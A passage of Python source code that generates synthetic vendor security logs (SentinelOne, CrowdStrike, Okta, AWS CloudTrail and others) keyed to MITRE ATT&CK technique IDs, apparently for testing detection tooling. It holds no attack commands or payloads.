            message=json.dumps(event_data),
            source_ip=fake.ipv4_private(),
            labels={
                "agent_id": agent_id,
                "classification": "Malware",
                "mitigation_status": "mitigated",
                "threat_name": "Trojan.PowerShell.Generic",
                "rank": str(event_data["rank"]),
                "engines": "reputation,static_ai"
            },
            process_name="powershell.exe",
            command_line=event_data["maliciousProcessArguments"],
            file_path=event_data["filePath"],
            process_sha256=event_data["fileContentHash"],
            pattern_id="T1059.001_POWERSHELL"
        )


# === REGISTRY OF ALL GENERATORS ===

AUTHENTIC_VENDOR_GENERATORS = {
    "Palo Alto Networks": PaloAltoGenerator,
    "Cisco ASA": CiscoASAGenerator, 
    "CrowdStrike": CrowdStrikeGenerator,
    "Okta": OktaGenerator,
    "AWS CloudTrail": AWSCloudTrailGenerator,
    "Azure AD": AzureADGenerator,
    "SentinelOne": SentinelOneGenerator,
}

# TTP to Vendor mapping for realistic scenarios
AUTHENTIC_TTP_VENDOR_MAPPINGS = {
    "T1071.001_WEB_PROTOCOLS": {
        "Palo Alto Networks": ["generate_traffic_log_allowed", "generate_url_filtering_log"],
        "CrowdStrike": ["generate_network_connection_log"]
    },
    "T1566.001_PHISHING_ATTACHMENT": {
        "Palo Alto Networks": ["generate_threat_log_malware"]
    },
    "T1046_NETWORK_SERVICE_SCANNING": {
        "Palo Alto Networks": ["generate_traffic_log_allowed"],
        "Cisco ASA": ["generate_connection_denied_log", "generate_threat_detection_log"]
    },
    "T1078_VALID_ACCOUNTS": {
        "Cisco ASA": ["generate_vpn_authentication_log"]
    },
    "T1078.004_VALID_ACCOUNTS_CLOUD": {
        "Okta": ["generate_user_authentication_log", "generate_suspicious_activity_log"],
        "AWS CloudTrail": ["generate_console_login_log"],
        "Azure AD": ["generate_signin_log", "generate_risky_signin_log"]
    },
    "T1059.001_POWERSHELL": {
        "CrowdStrike": ["generate_process_creation_log"],
        "SentinelOne": ["generate_threat_detection_log"]
    },
    "T1055_PROCESS_INJECTION": {
        "CrowdStrike": ["generate_detection_summary_log"]
    },
    "T1098_ACCOUNT_MANIPULATION": {
        "AWS CloudTrail": ["generate_iam_policy_change_log"]
    }
}


def generate_authentic_ttp_logs(ttp_id: str, vendor: str, count: int = 5) -> List[BaseEvent]:
    """Generate authentic logs for a specific TTP and vendor combination."""
    if ttp_id not in AUTHENTIC_TTP_VENDOR_MAPPINGS:
        raise ValueError(f"TTP {ttp_id} not supported in authentic mappings")
    
    if vendor not in AUTHENTIC_TTP_VENDOR_MAPPINGS[ttp_id]:
        raise ValueError(f"Vendor {vendor} not mapped for TTP {ttp_id}")
    
    if vendor not in AUTHENTIC_VENDOR_GENERATORS:
        raise ValueError(f"Authentic vendor generator for {vendor} not found")
    
    generator = AUTHENTIC_VENDOR_GENERATORS[vendor]()
    methods = AUTHENTIC_TTP_VENDOR_MAPPINGS[ttp_id][vendor]
    
    events = []
    for _ in range(count):
        method_name = random.choice(methods)
        if hasattr(generator, method_name):
            event = getattr(generator, method_name)()
            events.append(event)
    
    return events


def get_supported_ttps() -> Dict[str, List[str]]:
    """Get all supported TTPs and their associated vendors."""
    return {
        ttp_id: list(vendors.keys())
        for ttp_id, vendors in AUTHENTIC_TTP_VENDOR_MAPPINGS.items()
    }